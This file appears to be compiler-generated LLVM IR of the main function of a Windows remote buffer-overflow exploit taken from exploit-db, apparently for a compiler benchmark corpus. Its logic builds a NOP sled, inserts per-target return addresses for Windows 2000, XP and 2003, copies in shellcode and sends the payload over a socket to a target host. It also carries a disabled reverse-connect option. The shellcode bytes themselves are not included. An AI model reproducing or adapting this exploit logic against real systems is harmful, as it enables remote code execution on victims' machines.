; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_845.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_845.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i64 }
%struct.sockaddr_in = type { i16, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i8* }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"[+] socket() error\0A\00", align 1
@ebx = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [88 x i8] c"Win2k SP4 Server English\0A[+] Win2k SP4 Pro.   English\0A[+]            Win2k SP- -      -\00", align 1
@ebx2 = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [85 x i8] c"WinXP SP2  Pro. English\0A[+] WinXP SP1a Pro. English\0A[+]            WinXP SP-  -    -\00", align 1
@.str.3 = private unnamed_addr constant [52 x i8] c"Win2003 SP4 Server English\0A[+] Win2003 SP- -      -\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"[+] target(s): %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [44 x i8] c"[+] reverse mode disabled for this exploit\0A\00", align 1
@.str.6 = private unnamed_addr constant [57 x i8] c"[+] get the source at class101.org and update yourself!\0A\00", align 1
@.str.7 = private unnamed_addr constant [20 x i8] c"[+] select() error\0A\00", align 1
@.str.8 = private unnamed_addr constant [21 x i8] c"[+] connect() error\0A\00", align 1
@.str.9 = private unnamed_addr constant [44 x i8] c"[+] connected, constructing the payload...\0A\00", align 1
@payload = common dso_local global i8* null, align 8
@talk = common dso_local global i32 0, align 4
@pad = common dso_local global i8 0, align 1
@pad2 = common dso_local global i8* null, align 8
@EOL = common dso_local global i32 0, align 4
@scode = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [50 x i8] c"[+] sending error 1, the server prolly rebooted.\0A\00", align 1
@.str.11 = private unnamed_addr constant [25 x i8] c"[+] size of payload: %d\0A\00", align 1
@.str.12 = private unnamed_addr constant [19 x i8] c"[+] payload sent.\0A\00", align 1
@wsadata = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i16, align 2
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.timeval, align 8
  %15 = alloca %struct.sockaddr_in, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = call i32 (...) @ver()
  %17 = load i32, i32* %4, align 4
  %18 = icmp sgt i32 %17, 6
  br i1 %18, label %34, label %19

19:                                               ; preds = %2
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 3
  br i1 %21, label %34, label %22

22:                                               ; preds = %19
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @atoi(i8* %25)
  %27 = icmp sgt i32 %26, 3
  br i1 %27, label %34, label %28

28:                                               ; preds = %22
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31)
  %33 = icmp slt i32 %32, 1
  br i1 %33, label %34, label %39

34:                                               ; preds = %28, %22, %19, %2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @usage(i8* %37)
  store i32 -1, i32* %3, align 4
  br label %269

39:                                               ; preds = %28
  %40 = load i32, i32* %4, align 4
  %41 = icmp eq i32 %40, 5
  br i1 %41, label %42, label %47

42:                                               ; preds = %39
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @usage(i8* %45)
  store i32 -1, i32* %3, align 4
  br label %269

47:                                               ; preds = %39
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 2
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strlen(i8* %50)
  %52 = icmp slt i32 %51, 7
  br i1 %52, label %53, label %58

53:                                               ; preds = %47
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @usage(i8* %56)
  store i32 -1, i32* %3, align 4
  br label %269

58:                                               ; preds = %47
  %59 = load i32, i32* %4, align 4
  %60 = icmp eq i32 %59, 6
  br i1 %60, label %61, label %73

61:                                               ; preds = %58
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 4
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 @strlen(i8* %64)
  %66 = icmp slt i32 %65, 7
  br i1 %66, label %67, label %72

67:                                               ; preds = %61
  %68 = load i8**, i8*** %5, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 0
  %70 = load i8*, i8** %69, align 8
  %71 = call i32 @usage(i8* %70)
  store i32 -1, i32* %3, align 4
  br label %269

72:                                               ; preds = %61
  br label %73

73:                                               ; preds = %72, %58
  %74 = load i32, i32* %4, align 4
  %75 = icmp eq i32 %74, 6
  br i1 %75, label %76, label %91

76:                                               ; preds = %73
  %77 = load i8**, i8*** %5, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 4
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @inet_addr(i8* %79)
  %81 = sext i32 %80 to i64
  %82 = xor i64 %81, 2475922323
  store i64 %82, i64* %6, align 8
  %83 = load i8**, i8*** %5, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 5
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 @atoi(i8* %85)
  %87 = call signext i16 @htons(i32 %86)
  %88 = sext i16 %87 to i32
  %89 = xor i32 %88, -27757
  %90 = trunc i32 %89 to i16
  store i16 %90, i16* %7, align 2
  br label %91

91:                                               ; preds = %76, %73
  %92 = load i8**, i8*** %5, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 2
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @inet_addr(i8* %94)
  %96 = call i8* @htonl(i32 %95)
  %97 = ptrtoint i8* %96 to i32
  store i32 %97, i32* %10, align 4
  %98 = load i32, i32* %4, align 4
  %99 = icmp eq i32 %98, 4
  br i1 %99, label %103, label %100

100:                                              ; preds = %91
  %101 = load i32, i32* %4, align 4
  %102 = icmp eq i32 %101, 6
  br i1 %102, label %103, label %108

103:                                              ; preds = %100, %91
  %104 = load i8**, i8*** %5, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 3
  %106 = load i8*, i8** %105, align 8
  %107 = call i32 @atoi(i8* %106)
  store i32 %107, i32* %11, align 4
  br label %109

108:                                              ; preds = %100
  store i32 80, i32* %11, align 4
  br label %109

109:                                              ; preds = %108, %103
  %110 = load i32, i32* @AF_INET, align 4
  %111 = load i32, i32* @SOCK_STREAM, align 4
  %112 = call i32 @socket(i32 %110, i32 %111, i32 0)
  store i32 %112, i32* %12, align 4
  %113 = load i32, i32* %12, align 4
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %117

115:                                              ; preds = %109
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %269

117:                                              ; preds = %109
  %118 = load i8**, i8*** %5, align 8
  %119 = getelementptr inbounds i8*, i8** %118, i64 1
  %120 = load i8*, i8** %119, align 8
  %121 = call i32 @atoi(i8* %120)
  %122 = icmp eq i32 %121, 1
  br i1 %122, label %123, label %125

123:                                              ; preds = %117
  %124 = load i8*, i8** @ebx, align 8
  store i8* %124, i8** %8, align 8
  store i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.1, i64 0, i64 0), i8** %9, align 8
  br label %125

125:                                              ; preds = %123, %117
  %126 = load i8**, i8*** %5, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 1
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @atoi(i8* %128)
  %130 = icmp eq i32 %129, 2
  br i1 %130, label %131, label %133

131:                                              ; preds = %125
  %132 = load i8*, i8** @ebx2, align 8
  store i8* %132, i8** %8, align 8
  store i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.2, i64 0, i64 0), i8** %9, align 8
  br label %133

133:                                              ; preds = %131, %125
  %134 = load i8**, i8*** %5, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 1
  %136 = load i8*, i8** %135, align 8
  %137 = call i32 @atoi(i8* %136)
  %138 = icmp eq i32 %137, 3
  br i1 %138, label %139, label %141

139:                                              ; preds = %133
  %140 = load i8*, i8** @ebx2, align 8
  store i8* %140, i8** %8, align 8
  store i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.3, i64 0, i64 0), i8** %9, align 8
  br label %141

141:                                              ; preds = %139, %133
  %142 = load i8*, i8** %9, align 8
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0), i8* %142)
  %144 = load i32, i32* @AF_INET, align 4
  %145 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  store i32 %144, i32* %145, align 8
  %146 = load i32, i32* %10, align 4
  %147 = call i8* @htonl(i32 %146)
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  %149 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %148, i32 0, i32 0
  store i8* %147, i8** %149, align 8
  %150 = load i32, i32* %11, align 4
  %151 = call signext i16 @htons(i32 %150)
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  store i16 %151, i16* %152, align 8
  %153 = load i32, i32* %4, align 4
  %154 = icmp eq i32 %153, 6
  br i1 %154, label %155, label %158

155:                                              ; preds = %141
  %156 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.5, i64 0, i64 0))
  %157 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.6, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %269

158:                                              ; preds = %141
  %159 = load i32, i32* %12, align 4
  %160 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %161 = call i32 @connect(i32 %159, %struct.sockaddr* %160, i32 24)
  %162 = getelementptr inbounds %struct.timeval, %struct.timeval* %14, i32 0, i32 0
  store i32 3, i32* %162, align 8
  %163 = getelementptr inbounds %struct.timeval, %struct.timeval* %14, i32 0, i32 1
  store i64 0, i64* %163, align 8
  %164 = call i32 @FD_ZERO(i32* %13)
  %165 = load i32, i32* %12, align 4
  %166 = call i32 @FD_SET(i32 %165, i32* %13)
  %167 = load i32, i32* %12, align 4
  %168 = add nsw i32 %167, 1
  %169 = call i32 @select(i32 %168, i32* null, i32* %13, i32* null, %struct.timeval* %14)
  switch i32 %169, label %178 [
    i32 -1, label %170
    i32 0, label %174
  ]

170:                                              ; preds = %158
  %171 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.7, i64 0, i64 0))
  %172 = load i32, i32* %12, align 4
  %173 = call i32 (i32, ...) bitcast (i32 (...)* @close to i32 (i32, ...)*)(i32 %172)
  store i32 -1, i32* %3, align 4
  br label %269

174:                                              ; preds = %158
  %175 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0))
  %176 = load i32, i32* %12, align 4
  %177 = call i32 (i32, ...) bitcast (i32 (...)* @close to i32 (i32, ...)*)(i32 %176)
  store i32 -1, i32* %3, align 4
  br label %269

178:                                              ; preds = %158
  %179 = load i32, i32* %12, align 4
  %180 = call i32 @FD_ISSET(i32 %179, i32* %13)
  %181 = icmp ne i32 %180, 0
  br i1 %181, label %182, label %265

182:                                              ; preds = %178
  %183 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.9, i64 0, i64 0))
  %184 = call i32 (i32, ...) bitcast (i32 (...)* @sleep to i32 (i32, ...)*)(i32 1)
  %185 = load i8*, i8** @payload, align 8
  %186 = load i32, i32* @talk, align 4
  %187 = call i32 @strcpy(i8* %185, i32 %186)
  %188 = load i8*, i8** @payload, align 8
  %189 = getelementptr inbounds i8, i8* %188, i64 29
  %190 = ptrtoint i8* %189 to i32
  %191 = call i32 @memset(i32 %190, i32 144, i32 520)
  %192 = load i8**, i8*** %5, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 1
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194)
  %196 = icmp eq i32 %195, 1
  br i1 %196, label %203, label %197

197:                                              ; preds = %182
  %198 = load i8**, i8*** %5, align 8
  %199 = getelementptr inbounds i8*, i8** %198, i64 1
  %200 = load i8*, i8** %199, align 8
  %201 = call i32 @atoi(i8* %200)
  %202 = icmp eq i32 %201, 2
  br i1 %202, label %203, label %221

203:                                              ; preds = %197, %182
  %204 = load i8*, i8** @payload, align 8
  %205 = getelementptr inbounds i8, i8* %204, i64 29
  %206 = getelementptr inbounds i8, i8* %205, i64 492
  %207 = ptrtoint i8* %206 to i32
  %208 = call i32 @memcpy(i32 %207, i8* @pad, i32 4)
  %209 = load i8*, i8** @payload, align 8
  %210 = getelementptr inbounds i8, i8* %209, i64 521
  %211 = getelementptr inbounds i8, i8* %210, i64 4
  %212 = ptrtoint i8* %211 to i32
  %213 = load i8*, i8** %8, align 8
  %214 = call i32 @memcpy(i32 %212, i8* %213, i32 4)
  %215 = load i8*, i8** @payload, align 8
  %216 = getelementptr inbounds i8, i8* %215, i64 536
  %217 = getelementptr inbounds i8, i8* %216, i64 1
  %218 = ptrtoint i8* %217 to i32
  %219 = load i8*, i8** @pad2, align 8
  %220 = call i32 @memcpy(i32 %218, i8* %219, i32 5)
  br label %239

221:                                              ; preds = %197
  %222 = load i8*, i8** @payload, align 8
  %223 = getelementptr inbounds i8, i8* %222, i64 29
  %224 = getelementptr inbounds i8, i8* %223, i64 485
  %225 = ptrtoint i8* %224 to i32
  %226 = call i32 @memcpy(i32 %225, i8* @pad, i32 4)
  %227 = load i8*, i8** @payload, align 8
  %228 = getelementptr inbounds i8, i8* %227, i64 514
  %229 = getelementptr inbounds i8, i8* %228, i64 4
  %230 = ptrtoint i8* %229 to i32
  %231 = load i8*, i8** %8, align 8
  %232 = call i32 @memcpy(i32 %230, i8* %231, i32 4)
  %233 = load i8*, i8** @payload, align 8
  %234 = getelementptr inbounds i8, i8* %233, i64 529
  %235 = getelementptr inbounds i8, i8* %234, i64 1
  %236 = ptrtoint i8* %235 to i32
  %237 = load i8*, i8** @pad2, align 8
  %238 = call i32 @memcpy(i32 %236, i8* %237, i32 5)
  br label %239

239:                                              ; preds = %221, %203
  %240 = load i8*, i8** @payload, align 8
  %241 = load i32, i32* @EOL, align 4
  %242 = call i32 @strcat(i8* %240, i32 %241)
  %243 = load i8*, i8** @payload, align 8
  %244 = getelementptr inbounds i8, i8* %243, i64 36
  %245 = getelementptr inbounds i8, i8* %244, i64 3
  %246 = ptrtoint i8* %245 to i32
  %247 = load i8*, i8** @scode, align 8
  %248 = load i8*, i8** @scode, align 8
  %249 = call i32 @strlen(i8* %248)
  %250 = call i32 @memcpy(i32 %246, i8* %247, i32 %249)
  %251 = load i32, i32* %12, align 4
  %252 = load i8*, i8** @payload, align 8
  %253 = load i8*, i8** @payload, align 8
  %254 = call i32 @strlen(i8* %253)
  %255 = call i32 @send(i32 %251, i8* %252, i32 %254, i32 0)
  %256 = icmp eq i32 %255, -1
  br i1 %256, label %257, label %259

257:                                              ; preds = %239
  %258 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.10, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %269

259:                                              ; preds = %239
  %260 = call i32 (i32, ...) bitcast (i32 (...)* @sleep to i32 (i32, ...)*)(i32 2)
  %261 = load i8*, i8** @payload, align 8
  %262 = call i32 @strlen(i8* %261)
  %263 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.11, i64 0, i64 0), i32 %262)
  %264 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.12, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %269

265:                                              ; preds = %178
  br label %266

266:                                              ; preds = %265
  %267 = load i32, i32* %12, align 4
  %268 = call i32 (i32, ...) bitcast (i32 (...)* @close to i32 (i32, ...)*)(i32 %267)
  store i32 0, i32* %3, align 4
  br label %269

269:                                              ; preds = %266, %259, %257, %174, %170, %155, %115, %67, %53, %42, %34
  %270 = load i32, i32* %3, align 4
  ret i32 %270
}

declare dso_local i32 @ver(...) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local signext i16 @htons(i32) #1

declare dso_local i8* @htonl(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, %struct.timeval*) #1

declare dso_local i32 @close(...) #1

declare dso_local i32 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @sleep(...) #1

declare dso_local i32 @strcpy(i8*, i32) #1

declare dso_local i32 @memset(i32, i32, i32) #1

declare dso_local i32 @memcpy(i32, i8*, i32) #1

declare dso_local i32 @strcat(i8*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
